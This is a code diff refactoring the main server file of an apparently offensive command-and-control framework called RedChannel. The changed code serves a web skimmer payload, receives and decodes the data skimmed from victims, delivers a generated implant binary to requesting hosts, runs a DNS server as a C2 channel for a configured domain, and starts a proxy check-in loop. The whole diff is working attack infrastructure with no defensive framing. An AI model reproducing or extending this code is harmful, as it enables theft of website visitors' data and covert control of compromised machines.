@@ -2,6 +2,7 @@ import chalk from "chalk";
 import * as dnsd from "dnsd2";
 import * as fs from "fs";
 import { Command as Commander } from "commander";
+import express from "express";
 
 import RedChannel from "./lib/redchannel";
 import UserInterface from "./lib/ui";
@@ -61,18 +62,14 @@ redchannel.log = ui;
 
 ui.msg(chalk.redBright(Banner));
 
-const webServer = require("express")();
-webServer.listen(redchannel.modules.c2.config.web_port, redchannel.modules.c2.config.web_ip, (err) => {
-    if (err) return ui.error(`failed to start web server: ${err}`);
-    ui.info(`c2-web listening on: ${redchannel.modules.c2.config.web_ip}:${redchannel.modules.c2.config.web_port}`);
-});
+const webServer = express();
 
 /**
  * Skimmer routes
  */
 
 // incoming skimmer data
-webServer.get(redchannel.modules.skimmer.config.data_route, (request, response) => {
+webServer.get(redchannel.modules.skimmer.config.data_route, (request: express.Request, response: express.Response) => {
     ui.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);
 
     const decodedData = Buffer.from(request.query.id, "base64").toString();
@@ -80,25 +77,30 @@ webServer.get(redchannel.modules.skimmer.config.data_route, (request, response) 
     response.send("OK");
 });
 
-// server skimmer payload
-webServer.get(redchannel.modules.skimmer.config.payload_route, (request, response) => {
+// serve skimmer payload
+webServer.get(redchannel.modules.skimmer.config.payload_route, (request: express.Request, response: express.Response) => {
     let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
     ui.warn(`incoming request for skimmer payload from ${ip}`);
     response.send(redchannel.modules.skimmer.payload);
 });
 
 // agent binary payload
-webServer.get(redchannel.modules.c2.config.binary_route, (request, response) => {
+webServer.get(redchannel.modules.c2.config.binary_route, (request: express.Request, response: express.Response) => {
     let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
     ui.warn(`incoming request for agent binary from ${ip}`);
     try {
-        if (!fs.existsSync(redchannel.modules.implant.output_file)) throw new Error(`agent binary not found on disk, did you generate an implant?`);
-        response.sendFile(redchannel.modules.implant.output_file);
+        if (!fs.existsSync(redchannel.modules.implant.outputFile)) throw new Error(`agent binary not found on disk, did you generate an implant?`);
+        response.sendFile(redchannel.modules.implant.outputFile);
         ui.warn(`agent binary sent to ${ip}`);
     } catch (ex) {
         ui.error(`agent binary not sent to ${ip}, err: ${emsg(ex)}`);
         response.status(404).send("404 File Not Found");
     }
+});
+
+webServer.listen(redchannel.modules.c2.config.web_port, redchannel.modules.c2.config.web_ip, (err) => {
+    if (err) return ui.error(`failed to start web server: ${err}`);
+    ui.info(`c2-web listening on: ${redchannel.modules.c2.config.web_ip}:${redchannel.modules.c2.config.web_port}`);
 });
 
 /**
@@ -114,12 +116,13 @@ const dnsServer = dnsd.createServer(redchannel.c2MessageHandler.bind(redchannel)
 dnsServer.on("error", (ex, err) => {
     ui.error(`dns server error: ${emsg(ex)}, msg: ${emsg(err)}`);
 });
+const c2Domain = redchannel.modules.c2.config.domain;
 // prettier-ignore
 dnsServer
     .zone(
-        redchannel.modules.c2.config.domain,
-        "ns1." + redchannel.modules.c2.config.domain,
-        "root@" + redchannel.modules.c2.config.domain,
+        c2Domain,
+        "ns1." + c2Domain,
+        "root@" + c2Domain,
         "now",
         "2h",
         "30m",
@@ -128,10 +131,11 @@ dnsServer
     )
     .listen(redchannel.modules.c2.config.dns_port, redchannel.modules.c2.config.dns_ip);
 
-ui.info(`c2-dns listening on: ${redchannel.modules.c2.config.dns_ip}:${redchannel.modules.c2.config.dns_port}`);
+ui.info(`c2-dns listening on: ${redchannel.modules.c2.config.dns_ip}:${redchannel.modules.c2.config.dns_port}, c2 domain: ${c2Domain}`);
 
 if (redchannel.modules.proxy.config.enabled) {
     ui.info(`c2-proxy enabled, checkin at interval: ${redchannel.modules.proxy.config.interval}ms`);
+    redchannel.modules.proxy.proxyFetchLoop();
 } else {
     ui.info(`c2-proxy is disabled, see 'use proxy' -> 'help'`);
 }
